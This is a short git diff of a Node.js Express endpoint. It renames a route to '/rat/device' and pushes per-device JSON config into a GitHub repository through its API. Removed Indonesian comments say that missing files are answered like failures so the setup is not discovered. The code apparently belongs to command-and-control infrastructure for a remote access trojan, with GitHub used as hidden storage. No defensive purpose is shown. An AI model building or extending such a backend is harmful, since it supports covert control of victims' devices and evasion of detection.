@@ -4,7 +4,7 @@
     const GITHUB_USER = 'daffaadev';
     const GITHUB_REPO = 'api';
 
-    app.get('/search/file', async (req, res) => {
+    app.get('/rat/device', async (req, res) => {
         res.setHeader('Access-Control-Allow-Origin', '*');
 
         try {
@@ -38,7 +38,6 @@
             const BASE_PATH = `device/${token}`;
             const filePath = `${BASE_PATH}/${json}`;
 
-            // Cek apakah file sudah ada di GitHub (tanpa ngasih tau kalo gak ada)
             let fileExists = false;
             let currentSha = null;
             try {
@@ -54,11 +53,9 @@
                 fileExists = true;
                 currentSha = checkRes.data.sha;
             } catch (e) {
-                // Gak ngasih tau kalo file gak ada
                 fileExists = false;
             }
 
-            // ❌ KALO GAK ADA → RESPON SAMA KAYAK GAGAL (BIAR GAK KETAUAN)
             if (!fileExists) {
                 return res.status(404).json({
                     success: false,
@@ -66,8 +63,8 @@
                 });
             }
 
-            // ✅ KALO ADA → UPDATE
-            const contentBase64 = Buffer.from(code).toString('base64');
+            const formattedJson = JSON.stringify(parsedCode, null, 2);
+            const contentBase64 = Buffer.from(formattedJson).toString('base64');
 
             await axios.put(
                 `https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/contents/${filePath}`,
